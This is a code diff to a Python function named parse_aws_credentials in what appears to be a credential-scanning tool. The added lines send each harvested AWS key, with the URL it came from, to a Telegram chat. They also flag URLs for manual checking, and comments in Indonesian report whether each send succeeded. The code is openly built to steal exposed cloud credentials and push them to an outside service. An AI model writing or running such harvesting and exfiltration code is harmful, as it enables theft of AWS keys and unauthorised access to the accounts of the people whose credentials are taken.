@@ -38,6 +38,11 @@ def parse_aws_credentials(url: str, response_body: str) -> None:
             print(f'{url} - {formatstr}')
             with open('aws_credentials.txt', 'a') as f:
                 f.write(f'{formatstr}\n')
+            message = f"""
+            #aws key!
+            {url}
+            {formatstr}
+            """
             response = send_telegram_message(message)
             # Cek hasil pengiriman
             if response.status_code == 200:
@@ -49,6 +54,16 @@ def parse_aws_credentials(url: str, response_body: str) -> None:
         print(f'{url} - Check the AWS credentials manually')
         with open('check_manually.txt', 'a') as f:
             f.write(f'{url}\n')
+        message = f"""
+            #check manually!
+            {url}
+            """
+        response = send_telegram_message(message)
+            # Cek hasil pengiriman
+        if response.status_code == 200:
+            print('Berhasil mengirim Result Ke telegram')
+        else:
+            print('Failed to send message:', response.text)
 
 
 
